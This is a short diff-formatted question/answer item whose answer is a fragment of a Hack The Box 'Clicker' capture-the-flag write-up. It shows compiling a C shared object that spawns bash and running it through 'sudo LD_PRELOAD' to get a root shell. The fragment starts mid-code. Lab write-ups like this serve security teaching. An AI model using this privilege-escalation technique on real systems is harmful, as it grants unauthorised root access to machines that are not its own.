@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Clicker Hacks Stuff)
+
+CONTEXT:
+Source: Htb Clicker Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+system ( "/bin/bash" ); } There’s no compilation tools on the host, but since both it and my VM are Ubuntu-based, compiling locally shouldn’t cause issues. I’ll generate a .so file: oxdf@hacky$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles I’ll copy this file up to Clicker into /tmp . Now I can run with LD_PRELOAD pointing at this shared object and it will run bash : jack@clicker:~$ sudo LD_PRELOAD = /tmp/shell.so /opt/monitor.sh root@clicker:/home/jack#
